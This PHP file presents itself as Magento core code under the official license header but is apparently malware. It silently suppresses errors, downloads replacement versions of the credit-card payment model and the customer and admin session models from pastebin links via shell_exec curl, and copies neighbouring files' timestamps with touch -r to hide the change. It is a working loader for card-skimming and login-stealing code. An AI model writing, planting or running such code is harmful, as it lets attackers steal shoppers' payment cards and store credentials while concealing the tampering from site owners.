<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category   Mage
 * @package    Mage
 * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0))
 */

error_reporting(0);
function patch($path,$name,$size,$file,$link){
	if (file_exists($path.$name))
	{
		$fsize = filesize($path.$name);
		if ($fsize != $size)
		{
			if(is_writable($path))
			{
				shell_exec('curl -o '.$path.$name.' '.$link);
				shell_exec('touch -r '.$path.$file.' '.$path.$name);
			}
		}
	}
}

$dir = getcwd();
$path_a = $dir.'/app/code/core/Mage/Payment/Model/Method/';
$name_a = 'Cc.php';
$file_a = 'Abstract.php';
$size_a = 15127;
$link_a = 'http://pastebin.com/raw.php?i=A78sr324';

$path_b = $dir.'/app/code/core/Mage/Customer/Model/';
$name_b = 'Session.php';
$file_b = 'Group.php';
$size_b = 10882;
$link_b = 'http://pastebin.com/raw.php?i=rGtRemgU';

$path_c = $dir.'/app/code/core/Mage/Admin/Model/';
$name_c = 'Session.php';
$file_c = 'Config.php';
$size_c = 7739;
$link_c = 'http://pastebin.com/raw.php?i=tMxCsdAa';

patch($path_a,$name_a,$size_a,$file_a,$link_a);
patch($path_b,$name_b,$size_b,$file_b,$link_b);
patch($path_c,$name_c,$size_c,$file_c,$link_c);
clearstatcache();
?>